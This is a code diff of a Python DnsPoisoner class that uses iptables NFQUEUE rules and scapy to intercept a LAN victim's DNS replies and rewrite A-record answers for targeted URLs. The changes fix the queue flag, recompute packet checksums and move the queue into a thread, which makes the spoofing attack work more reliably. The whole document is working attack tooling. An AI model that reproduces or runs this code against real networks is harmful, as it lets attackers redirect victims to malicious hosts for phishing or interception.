@@ -1,20 +1,19 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue     #Library capable of handling IP packets
-import multiprocessing
+import threading
 import os
 
-class DnsPoisoner(multiprocessing.Process):
+class DnsPoisoner():
 
     def __init__(self, ip_victim, queue_num):
-
-        multiprocessing.Process.__init__(self)
 
         self.urls_to_spoof = {}
         self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
         #Create rules on how to handles packets destined for your LAN
-        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
-        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip_victim, queue_num)    #Restores original ip rule
-        self.exit          = multiprocessing.Event()
+        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
+        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)    #Restores original ip rule
+        self.thread        = threading.Thread(name="dns-poisoner-{}".format(queue_num), target=self.queue.run)
+        self.thread.setDaemon(True)
 
         #Initialize queue identified by queue_num and specify that the packets are passed as arguments of handle_packet()
         self.queue.bind(queue_num, self.handle_packet) 
@@ -34,32 +33,36 @@ class DnsPoisoner(multiprocessing.Process):
 
     def edit_dnsrr(self, packet):
         """Edits DNS request answer in order to poison"""
+
+        print "some dns reply intercepted"
+
         if packet[DNSQR].qname in self.urls_to_spoof.keys():
+
+            print "dns reply matches url to spoof: {}".format(packet[DNSQR].qname)
             
             if packet[DNSQR].qtype == "A":
                 packet[DNSRR].rdata = self.urls_to_spoof[packet[DNSQR].qname]
+                packet[DNS].ancount = 1
+                del(packet[IP].len)
+                del(packet[IP].chksum)
+                del(packet[UDP].len)
+                del(packet[UDP].chksum)
             
             if packet[DNSQR].qtype == "AAAA":
                 pass # TODO wat te doen met ipv6?
 
         return packet
 
-    def run(self):
+    def start(self):
 
-        self.exit.clear()
         os.system(self.iprule_add)    #make sure DNS packets are intercepted
-        self.queue.run()    #queue starts accepting packages
+        self.thread.start()    #queue starts accepting packages
 
-        print "DNS poisoning attack against {} started".format(self.ip)
+        print "DNS poisoning attack started"
 
-        while not self.exit.is_set():
-            time.sleep(1)
+    def stop(self):
 
         os.system(self.iprule_remove)    #make sure DNS packets are not intercepted anymore
         self.queue.unbind()    #delete queue
 
-        print "DNS poisoning attack against {} stopped".format(self.ip)
-
-    def stop(self):
-
-        self.exit.set()
+        print "DNS poisoning attack stopped"
